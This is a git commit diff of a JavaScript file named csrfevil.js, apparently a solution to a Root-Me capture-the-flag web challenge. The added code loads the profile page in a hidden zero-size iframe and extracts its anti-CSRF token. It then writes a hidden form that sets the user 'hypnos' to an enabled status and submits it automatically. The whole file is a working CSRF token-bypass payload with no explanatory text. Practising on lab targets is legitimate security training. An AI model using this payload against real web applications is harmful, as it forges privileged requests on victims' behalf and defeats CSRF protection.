597197db90f8c700dc82d9d8db33a2ec5501d788
noobintheshell <>
2018-07-04 00:07:00 +0200

    t

--- csrfevil.js
+++ csrfevil.js
@@ -1,7 +1,12 @@
-alert("test CSRF");
-document.writeln('<iframe id="iframe2" src="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" width="300" height="300" onload="read()"></iframe>');
+document.writeln('<iframe id="iframe2" src="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile" width="0" height="0" onload="read()"></iframe>');
 function read()
 {
-    alert("test iframe");
-    alert(document.getElementById("iframe2").contentDocument.getElementById("profile").token.value);
+    var name = 'hypnos';
+    var token = document.getElementById("iframe2").contentDocument.getElementById("profile").token.value;
+    document.writeln('<form name="test" method="post" action="http://challenge01.root-me.org/web-client/ch23/index.php?action=profile">');
+    document.writeln('<input id="username" type="hidden" name="username" value="' + name + '" /><br />');
+    document.writeln('<input id="status" type="checkbox" name="status" checked /><br />');
+    document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
+    document.writeln('</form>');
+    document.test.submit();
 }
